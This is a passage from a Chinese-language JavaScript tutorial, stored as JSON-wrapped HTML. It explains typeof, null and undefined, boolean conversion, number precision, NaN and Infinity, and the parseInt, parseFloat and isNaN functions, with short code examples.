class=\"prettyprint language-javascript\"><code>v\n// ReferenceError: v is not defined\n\ntypeof v\n// &quot;undefined&quot;</code></pre><p>上面代码中，变量<code>v</code>没有用<code>var</code>命令声明，直接使用就会报错。但是，放在<code>typeof</code>后面，就不报错了，而是返回<code>undefined</code>。</p>\n<p>实际编程中，这个特点通常用在判断语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 错误的写法\nif (v) {\n  // ...\n}\n// ReferenceError: v is not defined\n\n// 正确的写法\nif (typeof v === &quot;undefined&quot;) {\n  // ...\n}</code></pre><p>对象返回<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof window // &quot;object&quot;\ntypeof {} // &quot;object&quot;\ntypeof [] // &quot;object&quot;</code></pre><p>上面代码中，空数组（<code>[]</code>）的类型也是<code>object</code>，这表示在 JavaScript 内部，数组本质上只是一种特殊的对象。这里顺便提一下，<code>instanceof</code>运算符可以区分数组和对象。<code>instanceof</code>运算符的详细解释，请见《面向对象编程》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {};\nvar a = [];\n\no instanceof Array // false\na instanceof Array // true</code></pre><p><code>null</code>返回<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof null // &quot;object&quot;</code></pre><p><code>null</code>的类型是<code>object</code>，这是由于历史原因造成的。1995年的 JavaScript 语言第一版，只设计了五种数据类型（对象、整数、浮点数、字符串和布尔值），没考虑<code>null</code>，只把它当作<code>object</code>的一种特殊值。后来<code>null</code>独立出来，作为一种单独的数据类型，为了兼容以前的代码，<code>typeof null</code>返回<code>object</code>就没法改变了。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/11/improving-typeof.html\">Improving the JavaScript typeof operator</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"null，undefined和布尔值","link":"/types/null-undefined-boolean.html"}],"content":"\n        <h1>\n            <a href='#null,-undefined-和布尔值' class='header-anchor'>#</a>\n            <span>null, undefined 和布尔值</span>\n        </h1>\n    \n        <h2>\n            <a href='#null-和-undefined' class='header-anchor'>#</a>\n            <span>null 和 undefined</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p><code>null</code>与<code>undefined</code>都可以表示“没有”，含义非常相似。将一个变量赋值为<code>undefined</code>或<code>null</code>，老实说，语法效果几乎没区别。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = undefined;\n// 或者\nvar a = null;</code></pre><p>上面代码中，变量<code>a</code>分别被赋值为<code>undefined</code>和<code>null</code>，这两种写法的效果几乎等价。</p>\n<p>在<code>if</code>语句中，它们都会被自动转为<code>false</code>，相等运算符（<code>==</code>）甚至直接报告两者相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (!undefined) {\n  console.log(&#039;undefined is false&#039;);\n}\n// undefined is false\n\nif (!null) {\n  console.log(&#039;null is false&#039;);\n}\n// null is false\n\nundefined == null\n// true</code></pre><p>从上面代码可见，两者的行为是何等相似！谷歌公司开发的 JavaScript 语言的替代品 Dart 语言，就明确规定只有<code>null</code>，没有<code>undefined</code>！</p>\n<p>既然含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加复杂度，令初学者困扰吗？这与历史原因有关。</p>\n<p>1995年 JavaScript 诞生时，最初像 Java 一样，只设置了<code>null</code>表示&quot;无&quot;。根据 C 语言的传统，<code>null</code>可以自动转为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(null) // 0\n5 + null // 5</code></pre><p>上面代码中，<code>null</code>转为数字时，自动变成0。</p>\n<p>但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够。首先，第一版的 JavaScript 里面，<code>null</code>就像在 Java 里一样，被当成一个对象，Brendan Eich 觉得表示“无”的值最好不是对象。其次，那时的 JavaScript 不包括错误处理机制，Brendan Eich 觉得，如果<code>null</code>自动转为0，很不容易发现错误。</p>\n<p>因此，他又设计了一个<code>undefined</code>。区别是这样的：<code>null</code>是一个表示“空”的对象，转为数值时为<code>0</code>；<code>undefined</code>是一个表示&quot;此处无定义&quot;的原始值，转为数值时为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(undefined) // NaN\n5 + undefined // NaN</code></pre>\n        <h3>\n            <a href='#用法和含义' class='header-anchor'>#</a>\n            <span>用法和含义</span>\n        </h3>\n    <p>对于<code>null</code>和<code>undefined</code>，大致可以像下面这样理解。</p>\n<p><code>null</code>表示空值，即该处的值现在为空。调用函数时，某个参数未设置任何值，这时就可以传入<code>null</code>，表示该参数为空。比如，某个函数接受引擎抛出的错误作为参数，如果运行过程中未出错，那么这个参数就会传入<code>null</code>，表示未发生错误。</p>\n<p><code>undefined</code>表示“未定义”，下面是返回<code>undefined</code>的典型场景。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 变量声明了，但没有赋值\nvar i;\ni // undefined\n\n// 调用函数时，应该提供的参数没有提供，该参数等于 undefined\nfunction f(x) {\n  return x;\n}\nf() // undefined\n\n// 对象没有赋值的属性\nvar  o = new Object();\no.p // undefined\n\n// 函数没有返回值时，默认返回 undefined\nfunction f() {}\nf() // undefined</code></pre>\n        <h2>\n            <a href='#布尔值' class='header-anchor'>#</a>\n            <span>布尔值</span>\n        </h2>\n    <p>布尔值代表“真”和“假”两个状态。“真”用关键字<code>true</code>表示，“假”用关键字<code>false</code>表示。布尔值只有这两个值。</p>\n<p>下列运算符会返回布尔值：</p>\n<ul>\n<li>两元逻辑运算符： <code>&amp;&amp;</code> (And)，<code>||</code> (Or)</li>\n<li>前置逻辑运算符： <code>!</code> (Not)</li>\n<li>相等运算符：<code>===</code>，<code>!==</code>，<code>==</code>，<code>!=</code></li>\n<li>比较运算符：<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，<code>&lt;=</code></li>\n</ul>\n<p>如果 JavaScript 预期某个位置应该是布尔值，会将该位置上现有的值自动转为布尔值。转换规则是除了下面六个值被转为<code>false</code>，其他值都视为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>false</code></li>\n<li><code>0</code></li>\n<li><code>NaN</code></li>\n<li><code>&quot;&quot;</code>或<code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<p>布尔值往往用于程序流程的控制，请看一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (&#039;&#039;) {\n  console.log(&#039;true&#039;);\n}\n// 没有任何输出</code></pre><p>上面代码中，<code>if</code>命令后面的判断条件，预期应该是一个布尔值，所以 JavaScript 自动将空字符串，转为布尔值<code>false</code>，导致程序不会进入代码块，所以没有任何输出。</p>\n<p>注意，空数组（<code>[]</code>）和空对象（<code>{}</code>）对应的布尔值，都是<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if ([]) {\n  console.log(&#039;true&#039;);\n}\n// true\n\nif ({}) {\n  console.log(&#039;true&#039;);\n}\n// true</code></pre><p>更多关于数据类型转换的介绍，参见《数据类型转换》一章。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/01/categorizing-values.html\">Categorizing values in JavaScript</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"数值","link":"/types/number.html"}],"content":"\n        <h1>\n            <a href='#数值' class='header-anchor'>#</a>\n            <span>数值</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#整数和浮点数' class='header-anchor'>#</a>\n            <span>整数和浮点数</span>\n        </h3>\n    <p>JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以，<code>1</code>与<code>1.0</code>是相同的，是同一个数。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === 1.0 // true</code></pre><p>这就是说，JavaScript 语言的底层根本没有整数，所有数字都是小数（64位浮点数）。容易造成混淆的是，某些运算只有整数才能完成，此时 JavaScript 会自动把64位浮点数，转成32位整数，然后再进行运算，参见《运算符》一章的”位运算“部分。</p>\n<p>由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>0.1 + 0.2 === 0.3\n// false\n\n0.3 / 0.1\n// 2.9999999999999996\n\n(0.3 - 0.2) === (0.2 - 0.1)\n// false</code></pre>\n        <h3>\n            <a href='#数值精度' class='header-anchor'>#</a>\n            <span>数值精度</span>\n        </h3>\n    <p>根据国际标准 IEEE 754，JavaScript 浮点数的64个二进制位，从最左边开始，是这样组成的。</p>\n<ul>\n<li>第1位：符号位，<code>0</code>表示正数，<code>1</code>表示负数</li>\n<li>第2位到第12位（共11位）：指数部分</li>\n<li>第13位到第64位（共52位）：小数部分（即有效数字）</li>\n</ul>\n<p>符号位决定了一个数的正负，指数部分决定了数值的大小，小数部分决定了数值的精度。</p>\n<p>指数部分一共有11个二进制位，因此大小范围就是0到2047。IEEE 754 规定，如果指数部分的值在0到2047之间（不含两个端点），那么有效数字的第一位默认总是1，不保存在64位浮点数之中。也就是说，有效数字这时总是<code>1.xx...xx</code>的形式，其中<code>xx..xx</code>的部分保存在64位浮点数之中，最长可能为52位。因此，JavaScript 提供的有效数字最长为53个二进制位。</p>\n<pre class=\"prettyprint\"><code>(-1)^符号位 * 1.xx...xx * 2^指数部分</code></pre><p>上面公式是正常情况下（指数部分在0到2047之间），一个数在 JavaScript 内部实际的表示形式。</p>\n<p>精度最多只能到53个二进制位，这意味着，绝对值小于等于2的53次方的整数，即-2<sup>53</sup>到2<sup>53</sup>，都可以精确表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 53)\n// 9007199254740992\n\nMath.pow(2, 53) + 1\n// 9007199254740992\n\nMath.pow(2, 53) + 2\n// 9007199254740994\n\nMath.pow(2, 53) + 3\n// 9007199254740996\n\nMath.pow(2, 53) + 4\n// 9007199254740996</code></pre><p>上面代码中，大于2的53次方以后，整数运算的结果开始出现错误。所以，大于2的53次方的数值，都无法保持精度。由于2的53次方是一个16位的十进制数值，所以简单的法则就是，JavaScript 对15位的十进制数都可以精确处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 53)\n// 9007199254740992\n\n// 多出的三个有效数字，将无法保存\n9007199254740992111\n// 9007199254740992000</code></pre><p>上面示例表明，大于2的53次方以后，多出来的有效数字（最后三位的<code>111</code>）都会无法保存，变成0。</p>\n\n        <h3>\n            <a href='#数值范围' class='header-anchor'>#</a>\n            <span>数值范围</span>\n        </h3>\n    <p>根据标准，64位浮点数的指数部分的长度是11个二进制位，意味着指数部分的最大值是2047（2的11次方减1）。也就是说，64位浮点数的指数部分的值最大为2047，分出一半表示负数，则 JavaScript 能够表示的数值范围为2<sup>1024</sup>到2<sup>-1023</sup>（开区间），超出这个范围的数无法表示。</p>\n<p>如果一个数大于等于2的1024次方，那么就会发生“正向溢出”，即 JavaScript 无法表示这么大的数，这时就会返回<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 1024) // Infinity</code></pre><p>如果一个数小于等于2的-1075次方（指数部分最小值-1023，再加上小数部分的52位），那么就会发生为“负向溢出”，即 JavaScript 无法表示这么小的数，这时会直接返回0。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, -1075) // 0</code></pre><p>下面是一个实际的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 0.5;\n\nfor(var i = 0; i &lt; 25; i++) {\n  x = x * x;\n}\n\nx // 0</code></pre><p>上面代码中，对<code>0.5</code>连续做25次平方，由于最后结果太接近0，超出了可表示的范围，JavaScript 就直接将其转为0。</p>\n<p>JavaScript 提供<code>Number</code>对象的<code>MAX_VALUE</code>和<code>MIN_VALUE</code>属性，返回可以表示的具体的最大值和最小值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.MAX_VALUE // 1.7976931348623157e+308\nNumber.MIN_VALUE // 5e-324</code></pre>\n        <h2>\n            <a href='#数值的表示法' class='header-anchor'>#</a>\n            <span>数值的表示法</span>\n        </h2>\n    <p>JavaScript 的数值有多种表示方法，可以用字面形式直接表示，比如<code>35</code>（十进制）和<code>0xFF</code>（十六进制）。</p>\n<p>数值也可以采用科学计数法表示，下面是几个科学计数法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>123e3 // 123000\n123e-3 // 0.123\n-3.1E+12\n.1e-23</code></pre><p>科学计数法允许字母<code>e</code>或<code>E</code>的后面，跟着一个整数，表示这个数值的指数部分。</p>\n<p>以下两种情况，JavaScript 会自动将数值转为科学计数法表示，其他情况都采用字面形式直接表示。</p>\n<p><strong>（1）小数点前的数字多于21位。</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>1234567890123456789012\n// 1.2345678901234568e+21\n\n123456789012345678901\n// 123456789012345680000</code></pre><p><strong>（2）小数点后的零多于5个。</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>// 小数点后紧跟5个以上的零，\n// 就自动转为科学计数法\n0.0000003 // 3e-7\n\n// 否则，就保持原来的字面形式\n0.000003 // 0.000003</code></pre>\n        <h2>\n            <a href='#数值的进制' class='header-anchor'>#</a>\n            <span>数值的进制</span>\n        </h2>\n    <p>使用字面量（literal）直接表示一个数值时，JavaScript 对整数提供四种进制的表示方法：十进制、十六进制、八进制、二进制。</p>\n<ul>\n<li>十进制：没有前导0的数值。</li>\n<li>八进制：有前缀<code>0o</code>或<code>0O</code>的数值，或者有前导0、且只用到0-7的八个阿拉伯数字的数值。</li>\n<li>十六进制：有前缀<code>0x</code>或<code>0X</code>的数值。</li>\n<li>二进制：有前缀<code>0b</code>或<code>0B</code>的数值。</li>\n</ul>\n<p>默认情况下，JavaScript 内部会自动将八进制、十六进制、二进制转为十进制。下面是一些例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>0xff // 255\n0o377 // 255\n0b11 // 3</code></pre><p>如果八进制、十六进制、二进制的数值里面，出现不属于该进制的数字，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>0xzz // 报错\n0o88 // 报错\n0b22 // 报错</code></pre><p>上面代码中，十六进制出现了字母<code>z</code>、八进制出现数字<code>8</code>、二进制出现数字<code>2</code>，因此报错。</p>\n<p>通常来说，有前导0的数值会被视为八进制，但是如果前导0后面有数字<code>8</code>和<code>9</code>，则该数值被视为十进制。</p>\n<pre class=\"prettyprint language-javascript\"><code>0888 // 888\n0777 // 511</code></pre><p>前导0表示八进制，处理时很容易造成混乱。ES5 的严格模式和 ES6，已经废除了这种表示法，但是浏览器为了兼容以前的代码，目前还继续支持这种表示法。</p>\n\n        <h2>\n            <a href='#特殊数值' class='header-anchor'>#</a>\n            <span>特殊数值</span>\n        </h2>\n    <p>JavaScript 提供了几个特殊的数值。</p>\n\n        <h3>\n            <a href='#正零和负零' class='header-anchor'>#</a>\n            <span>正零和负零</span>\n        </h3>\n    <p>前面说过，JavaScript 的64位浮点数之中，有一个二进制位是符号位。这意味着，任何一个数都有一个对应的负值，就连<code>0</code>也不例外。</p>\n<p>JavaScript 内部实际上存在2个<code>0</code>：一个是<code>+0</code>，一个是<code>-0</code>，区别就是64位浮点数表示法的符号位不同。它们是等价的。</p>\n<pre class=\"prettyprint language-javascript\"><code>-0 === +0 // true\n0 === -0 // true\n0 === +0 // true</code></pre><p>几乎所有场合，正零和负零都会被当作正常的<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>+0 // 0\n-0 // 0\n(-0).toString() // &#039;0&#039;\n(+0).toString() // &#039;0&#039;</code></pre><p>唯一有区别的场合是，<code>+0</code>或<code>-0</code>当作分母，返回的值是不相等的。</p>\n<pre class=\"prettyprint language-javascript\"><code>(1 / +0) === (1 / -0) // false</code></pre><p>上面的代码之所以出现这样结果，是因为除以正零得到<code>+Infinity</code>，除以负零得到<code>-Infinity</code>，这两者是不相等的（关于<code>Infinity</code>详见下文）。</p>\n\n        <h3>\n            <a href='#NaN' class='header-anchor'>#</a>\n            <span>NaN</span>\n        </h3>\n    <p><strong>（1）含义</strong></p>\n<p><code>NaN</code>是 JavaScript 的特殊值，表示“非数字”（Not a Number），主要出现在将字符串解析成数字出错的场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 - &#039;x&#039; // NaN</code></pre><p>上面代码运行时，会自动将字符串<code>x</code>转为数值，但是由于<code>x</code>不是数值，所以最后得到结果为<code>NaN</code>，表示它是“非数字”（<code>NaN</code>）。</p>\n<p>另外，一些数学函数的运算结果会出现<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.acos(2) // NaN\nMath.log(-1) // NaN\nMath.sqrt(-1) // NaN</code></pre><p><code>0</code>除以<code>0</code>也会得到<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 / 0 // NaN</code></pre><p>需要注意的是，<code>NaN</code>不是独立的数据类型，而是一个特殊数值，它的数据类型依然属于<code>Number</code>，使用<code>typeof</code>运算符可以看得很清楚。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof NaN // &#039;number&#039;</code></pre><p><strong>（2）运算规则</strong></p>\n<p><code>NaN</code>不等于任何值，包括它本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN === NaN // false</code></pre><p>数组的<code>indexOf</code>方法内部使用的是严格相等运算符，所以该方法对<code>NaN</code>不成立。</p>\n<pre class=\"prettyprint language-javascript\"><code>[NaN].indexOf(NaN) // -1</code></pre><p><code>NaN</code>在布尔运算时被当作<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(NaN) // false</code></pre><p><code>NaN</code>与任何数（包括它自己）的运算，得到的都是<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN + 32 // NaN\nNaN - 32 // NaN\nNaN * 32 // NaN\nNaN / 32 // NaN</code></pre>\n        <h3>\n            <a href='#Infinity' class='header-anchor'>#</a>\n            <span>Infinity</span>\n        </h3>\n    <p><strong>（1）含义</strong></p>\n<p><code>Infinity</code>表示“无穷”，用来表示两种场景。一种是一个正的数值太大，或一个负的数值太小，无法表示；另一种是非0数值除以0，得到<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 场景一\nMath.pow(2, 1024)\n// Infinity\n\n// 场景二\n0 / 0 // NaN\n1 / 0 // Infinity</code></pre><p>上面代码中，第一个场景是一个表达式的计算结果太大，超出了能够表示的范围，因此返回<code>Infinity</code>。第二个场景是<code>0</code>除以<code>0</code>会得到<code>NaN</code>，而非0数值除以<code>0</code>，会返回<code>Infinity</code>。</p>\n<p><code>Infinity</code>有正负之分，<code>Infinity</code>表示正的无穷，<code>-Infinity</code>表示负的无穷。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity === -Infinity // false\n\n1 / -0 // -Infinity\n-1 / -0 // Infinity</code></pre><p>上面代码中，非零正数除以<code>-0</code>，会得到<code>-Infinity</code>，负数除以<code>-0</code>，会得到<code>Infinity</code>。</p>\n<p>由于数值正向溢出（overflow）、负向溢出（underflow）和被<code>0</code>除，JavaScript 都不报错，而是返回<code>Infinity</code>，所以单纯的数学运算几乎没有可能抛出错误。</p>\n<p><code>Infinity</code>大于一切数值（除了<code>NaN</code>），<code>-Infinity</code>小于一切数值（除了<code>NaN</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity &gt; 1000 // true\n-Infinity &lt; -1000 // true</code></pre><p><code>Infinity</code>与<code>NaN</code>比较，总是返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity &gt; NaN // false\n-Infinity &gt; NaN // false\n\nInfinity &lt; NaN // false\n-Infinity &lt; NaN // false</code></pre><p><strong>（2）运算规则</strong></p>\n<p><code>Infinity</code>的四则运算，符合无穷的数学计算规则。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 * Infinity // Infinity\n5 - Infinity // -Infinity\nInfinity / 5 // Infinity\n5 / Infinity // 0</code></pre><p>0乘以<code>Infinity</code>，返回<code>NaN</code>；0除以<code>Infinity</code>，返回<code>0</code>；<code>Infinity</code>除以0，返回<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 * Infinity // NaN\n0 / Infinity // 0\nInfinity / 0 // Infinity</code></pre><p><code>Infinity</code>加上或乘以<code>Infinity</code>，返回的还是<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity + Infinity // Infinity\nInfinity * Infinity // Infinity</code></pre><p><code>Infinity</code>减去或除以<code>Infinity</code>，得到<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity - Infinity // NaN\nInfinity / Infinity // NaN</code></pre><p><code>Infinity</code>与<code>null</code>计算时，<code>null</code>会转成0，等同于与<code>0</code>的计算。</p>\n<pre class=\"prettyprint language-javascript\"><code>null * Infinity // NaN\nnull / Infinity // 0\nInfinity / null // Infinity</code></pre><p><code>Infinity</code>与<code>undefined</code>计算，返回的都是<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>undefined + Infinity // NaN\nundefined - Infinity // NaN\nundefined * Infinity // NaN\nundefined / Infinity // NaN\nInfinity / undefined // NaN</code></pre>\n        <h2>\n            <a href='#与数值相关的全局方法' class='header-anchor'>#</a>\n            <span>与数值相关的全局方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#parseInt()' class='header-anchor'>#</a>\n            <span>parseInt()</span>\n        </h3>\n    <p><strong>（1）基本用法</strong></p>\n<p><code>parseInt</code>方法用于将字符串转为整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;123&#039;) // 123</code></pre><p>如果字符串头部有空格，空格会被自动去除。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;   81&#039;) // 81</code></pre><p>如果<code>parseInt</code>的参数不是字符串，则会先转为字符串再转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(1.23) // 1\n// 等同于\nparseInt(&#039;1.23&#039;) // 1</code></pre><p>字符串转为整数的时候，是一个个字符依次转换，如果遇到不能转为数字的字符，就不再进行下去，返回已经转好的部分。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;8a&#039;) // 8\nparseInt(&#039;12**&#039;) // 12\nparseInt(&#039;12.34&#039;) // 12\nparseInt(&#039;15e2&#039;) // 15\nparseInt(&#039;15px&#039;) // 15</code></pre><p>上面代码中，<code>parseInt</code>的参数都是字符串，结果只返回字符串头部可以转为数字的部分。</p>\n<p>如果字符串的第一个字符不能转化为数字（后面跟着数字的正负号除外），返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;abc&#039;) // NaN\nparseInt(&#039;.3&#039;) // NaN\nparseInt(&#039;&#039;) // NaN\nparseInt(&#039;+&#039;) // NaN\nparseInt(&#039;+1&#039;) // 1</code></pre><p>所以，<code>parseInt</code>的返回值只有两种可能，要么是一个十进制整数，要么是<code>NaN</code>。</p>\n<p>如果字符串以<code>0x</code>或<code>0X</code>开头，<code>parseInt</code>会将其按照十六进制数解析。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;0x10&#039;) // 16</code></pre><p>如果字符串以<code>0</code>开头，将其按照10进制解析。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;011&#039;) // 11</code></pre><p>对于那些会自动转为科学计数法的数字，<code>parseInt</code>会将科学计数法的表示方法视为字符串，因此导致一些奇怪的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(1000000000000000000000.5) // 1\n// 等同于\nparseInt(&#039;1e+21&#039;) // 1\n\nparseInt(0.0000008) // 8\n// 等同于\nparseInt(&#039;8e-7&#039;) // 8</code></pre><p><strong>（2）进制转换</strong></p>\n<p><code>parseInt</code>方法还可以接受第二个参数（2到36之间），表示被解析的值的进制，返回该值对应的十进制数。默认情况下，<code>parseInt</code>的第二个参数为10，即默认是十进制转十进制。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1000&#039;) // 1000\n// 等同于\nparseInt(&#039;1000&#039;, 10) // 1000</code></pre><p>下面是转换指定进制的数的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1000&#039;, 2) // 8\nparseInt(&#039;1000&#039;, 6) // 216\nparseInt(&#039;1000&#039;, 8) // 512</code></pre><p>上面代码中，二进制、六进制、八进制的<code>1000</code>，分别等于十进制的8、216和512。这意味着，可以用<code>parseInt</code>方法进行进制的转换。</p>\n<p>如果第二个参数不是数值，会被自动转为一个整数。这个整数只有在2到36之间，才能得到有意义的结果，超出这个范围，则返回<code>NaN</code>。如果第二个参数是<code>0</code>、<code>undefined</code>和<code>null</code>，则直接忽略。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;10&#039;, 37) // NaN\nparseInt(&#039;10&#039;, 1) // NaN\nparseInt(&#039;10&#039;, 0) // 10\nparseInt(&#039;10&#039;, null) // 10\nparseInt(&#039;10&#039;, undefined) // 10</code></pre><p>如果字符串包含对于指定进制无意义的字符，则从最高位开始，只返回可以转换的数值。如果最高位无法转换，则直接返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1546&#039;, 2) // 1\nparseInt(&#039;546&#039;, 2) // NaN</code></pre><p>上面代码中，对于二进制来说，<code>1</code>是有意义的字符，<code>5</code>、<code>4</code>、<code>6</code>都是无意义的字符，所以第一行返回1，第二行返回<code>NaN</code>。</p>\n<p>前面说过，如果<code>parseInt</code>的第一个参数不是字符串，会被先转为字符串。这会导致一些令人意外的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(0x11, 36) // 43\nparseInt(0x11, 2) // 1\n\n// 等同于\nparseInt(String(0x11), 36)\nparseInt(String(0x11), 2)\n\n// 等同于\nparseInt(&#039;17&#039;, 36)\nparseInt(&#039;17&#039;, 2)</code></pre><p>上面代码中，十六进制的<code>0x11</code>会被先转为十进制的17，再转为字符串。然后，再用36进制或二进制解读字符串<code>17</code>，最后返回结果<code>43</code>和<code>1</code>。</p>\n<p>这种处理方式，对于八进制的前缀0，尤其需要注意。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(011, 2) // NaN\n\n// 等同于\nparseInt(String(011), 2)\n\n// 等同于\nparseInt(String(9), 2)</code></pre><p>上面代码中，第一行的<code>011</code>会被先转为字符串<code>9</code>，因为<code>9</code>不是二进制的有效字符，所以返回<code>NaN</code>。如果直接计算<code>parseInt(&#39;011&#39;, 2)</code>，<code>011</code>则是会被当作二进制处理，返回3。</p>\n<p>JavaScript 不再允许将带有前缀0的数字视为八进制数，而是要求忽略这个<code>0</code>。但是，为了保证兼容性，大部分浏览器并没有部署这一条规定。</p>\n\n        <h3>\n            <a href='#parseFloat()' class='header-anchor'>#</a>\n            <span>parseFloat()</span>\n        </h3>\n    <p><code>parseFloat</code>方法用于将一个字符串转为浮点数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;3.14&#039;) // 3.14</code></pre><p>如果字符串符合科学计数法，则会进行相应的转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;314e-2&#039;) // 3.14\nparseFloat(&#039;0.0314E+2&#039;) // 3.14</code></pre><p>如果字符串包含不能转为浮点数的字符，则不再进行往后转换，返回已经转好的部分。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;3.14more non-digit characters&#039;) // 3.14</code></pre><p><code>parseFloat</code>方法会自动过滤字符串前导的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;\\t\\v\\r12.34\\n &#039;) // 12.34</code></pre><p>如果参数不是字符串，或者字符串的第一个字符不能转化为浮点数，则返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat([]) // NaN\nparseFloat(&#039;FF2&#039;) // NaN\nparseFloat(&#039;&#039;) // NaN</code></pre><p>上面代码中，尤其值得注意，<code>parseFloat</code>会将空字符串转为<code>NaN</code>。</p>\n<p>这些特点使得<code>parseFloat</code>的转换结果不同于<code>Number</code>函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(true)  // NaN\nNumber(true) // 1\n\nparseFloat(null) // NaN\nNumber(null) // 0\n\nparseFloat(&#039;&#039;) // NaN\nNumber(&#039;&#039;) // 0\n\nparseFloat(&#039;123.45#&#039;) // 123.45\nNumber(&#039;123.45#&#039;) // NaN</code></pre>\n        <h3>\n            <a href='#isNaN()' class='header-anchor'>#</a>\n            <span>isNaN()</span>\n        </h3>\n    <p><code>isNaN</code>方法可以用来判断一个值是否为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN(NaN) // true\nisNaN(123) // false</code></pre><p>但是，<code>isNaN</code>只对数值有效，如果传入其他值，会被先转成数值。比如，传入字符串的时候，字符串会被先转成<code>NaN</code>，所以最后返回<code>true</code>，这一点要特别引起注意。也就是说，<code>isNaN</code>为<code>true</code>的值，有可能不是<code>NaN</code>，而是一个字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN(&#039;Hello&#039;) // true\n// 相当于\nisNaN(Number(&#039;Hello&#039;)) // true</code></pre><p>出于同样的原因，对于对象和数组，<code>isNaN</code>也返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN({}) // true\n// 等同于\nisNaN(Number({})) // true\n\nisNaN([&#039;xzy&#039;]) // true\n// 